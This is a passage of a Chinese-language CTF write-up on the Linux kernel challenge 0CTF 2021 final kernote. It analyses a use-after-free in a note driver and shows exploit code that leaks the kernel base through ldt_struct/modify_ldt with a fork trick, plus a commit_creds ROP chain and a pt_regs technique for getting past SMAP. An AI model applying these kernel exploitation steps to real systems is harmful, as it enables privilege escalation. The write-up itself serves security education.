c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> chang_cr3 = <span class="number">0xffffffff81c00feb</span> + kernel_offset;</span><br><span class="line">fake_stack[i++] = pop_rdi;</span><br><span class="line">fake_stack[i++] = init_cred;</span><br><span class="line">fake_stack[i++] = commit_creds;</span><br><span class="line">fake_stack[i++] = chang_cr3;</span><br><span class="line">fake_stack[i++] = swapgs;</span><br><span class="line">fake_stack[i++] = iretq;</span><br><span class="line">fake_stack[i++] = (<span class="keyword">uint64_t</span>)get_shell;</span><br><span class="line">fake_stack[i++] = user_cs;</span><br><span class="line">fake_stack[i++] = user_rflags;</span><br><span class="line">fake_stack[i++] = user_sp;</span><br><span class="line">fake_stack[i++] = user_ss;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814123321832.png"                      alt="image-20220814123321832"                ></p><h3 id="0CTF-2021-final-kernote"><a href="#0CTF-2021-final-kernote" class="headerlink" title="0CTF 2021 final kernote"></a>0CTF 2021 final kernote</h3><p>题目基本和上面一道题一致，不过这里的文件系统采用的ext4，需要拿到内部文件的方法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mount ./rootfs.img ./rootfs</span><br><span class="line">......</span><br><span class="line">sudo umount ./rootfs</span><br></pre></td></tr></table></figure><p>这道题目开启的保护有smep，smap，kpti以及kaslr，然后就是题目给了一个raedme文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></figure><p>可以看到题目使用的堆分配算法是slab而不是默认的slub，所以需要了解一下关于slab的一些特征：</p><ol><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</li></ol><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h4><p>接下来开始直接进行逆向分析驱动</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6667</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        a2 = <span class="number">0xCC0</span>LL;</span><br><span class="line">        v8 = (<span class="keyword">unsigned</span> __int64 *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">0xCC0</span>LL, <span class="number">8LL</span>, v5, <span class="number">-1LL</span>);</span><br><span class="line">        buf[v3] = v8;</span><br><span class="line">        v10 = -(__int64)(v8 == <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先从0x6667这个create来看，这里的<code>kmem_cache_alloc_trace</code>函数我在源码中找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="function"><span class="keyword">void</span> *<span class="title">kmem_cache_alloc_trace</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                                    <span class="keyword">gfp_t</span> flags, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line"></span><br><span class="line">    ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是这样定义的，只存在三个参数，第三个参数还是size，所以这里在ioctl中的create函数的size是固定的8字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_HIGH((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">(MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_MAXKMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_LOW5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLUB directly allocates requests fitting in to an order-1 page</span></span><br><span class="line"><span class="comment"> * (PAGE_SIZE*2).  Larger requests are passed to the page allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_HIGH(PAGE_SHIFT + 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLOB passes all requests larger than one page to the page allocator.</span></span><br><span class="line"><span class="comment"> * No kmalloc array is necessary since objects of different sizes can</span></span><br><span class="line"><span class="comment"> * be allocated from the same page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_HIGHPAGE_SHIFT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum allocatable size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MAX_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_MAX)</span></span><br><span class="line"><span class="comment">/* Maximum size for which we actually use a slab cache */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MAX_CACHE_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_HIGH)</span></span><br><span class="line"><span class="comment">/* Maximum order allocatable via the slab allocator */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MAX_ORDER(KMALLOC_SHIFT_MAX - PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里可以看到除了slab的最小的size为32，那么我们取出object也是从kmalloc-32中取出，并且可以看到slob和slub最小的size都是8。</p><p>所以虽然这里create时的size是固定的但是他申请出来的object的实际大小为32请求的大小也是32。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    note = buf[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在0x6666中实现的是将buf中的object放到另一个全局变量，note中去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6668</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v9 = buf[v3];</span><br><span class="line">        <span class="keyword">if</span> ( v9 )</span><br><span class="line">        &#123;</span><br><span class="line">            kfree(v9, a2, v4, v5, <span class="number">-1LL</span>);</span><br><span class="line">            v10 = <span class="number">0LL</span>;</span><br><span class="line">            buf[v3] = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显的就是free，并且是非常明显的UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6669</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v10 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( note )</span><br><span class="line">    &#123;</span><br><span class="line">        *note = v3;</span><br><span class="line">        v10 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是修改，但是值可以修改前8bit。这里题目其实还有一个选项，不过没什么用就不做解释了。</p><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a><strong>利用分析</strong></h4><p>相信提到这里就很清楚思路跟上面那道题基本是一致的了，因为最小size是32那也就决定了ldt_struct和seq_operations申请的size也都是32。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    <span class="keyword">int</span> ret = syscall(SYS_modify_ldt, <span class="number">0</span>, tmp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        addr += <span class="number">0x40000000</span>;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)buf = addr;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %p\n&quot;</span>, addr);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr = addr;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">            kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是单纯使用上一道题目方法的代码<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220814142800527.png"                      alt="image-20220814142800527"                ></p><p>可以看到在下面搜索基地址，会直接崩溃掉，这是因为触发了Hardened Usercopy保护。在fork的系统调用中存在一条调用链：</p><p><code>sys_fork()</code>=&gt;<code>kernel_clone()</code>=&gt;<code>copy_process()</code>=&gt;<code>copy_mm()</code>=&gt;<code>dup_mm()</code>=&gt;<code>dup_mmap()</code>=&gt;<code>arch_dup_mmap()</code>=&gt;<code>ldt_dup_context()</code></p><p>最后的ldt_dup_context函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ldt_dup_context</span><span class="params">(struct mm_struct *old_mm, struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!old_mm)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">    <span class="keyword">if</span> (!old_mm-&gt;context.ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt) &#123;</span><br><span class="line">        retval = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">    finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">    retval = map_ldt_struct(mm, new_ldt, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval) &#123;</span><br><span class="line">        free_ldt_pgtables(mm);</span><br><span class="line">        free_ldt_struct(new_ldt);</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line">    mm-&gt;context.ldt = new_ldt;</span><br><span class="line"></span><br><span class="line">    out_unlock:</span><br><span class="line">    mutex_unlock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到中间存在一条memcpy函数是将父进程的ldt结构体的entries指向的内容拷贝到子进程ldt结构体的entries指针指向的位置。这样避免了把dir直接copy_to_user给用户态，这里memcpy都是在内核态进行的，所以也就避免了Hardened Usercopy保护。所以这里应该改为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pipe(pipe_fd);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    edit(*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)buf);</span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, info, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = info[i] - <span class="number">0x40</span>;</span><br><span class="line">                kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">    &#123;</span><br><span class="line">        kernel_offset = kernel_base - vmlinux_base;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr += <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)buf = search_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一步就跟刚刚一样我们要进行ROP，但是这道题恶心的地方的来了，这里开启了smap所以我们没法向上一道题目那样直接将ROP写在用户态，所以这里需要借助一个结构体pt_regs：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line">    <span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line">    <span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line">    <span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这个结构体的所有成员都是以寄存器命名的，并且内核中处理系统调用的入口函数entry_SYSCALL_64的源码中存在一条这样的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>这条指令会将所有寄存器压入进内核的栈中，形成一个pt_reg结构体：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/NwjgEMse8cTCdLr.png"                      alt="image-20220814123321832"                ></p><p>当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 rsp 与 栈底的相对偏移通常是不变的，而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们布置 ROP 链提供了可能。</p><h4 id="综上，得出exp-1"><a href="#综上，得出exp-1" class="headerlink" title="综上，得出exp"></a><strong>综上，得出exp</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 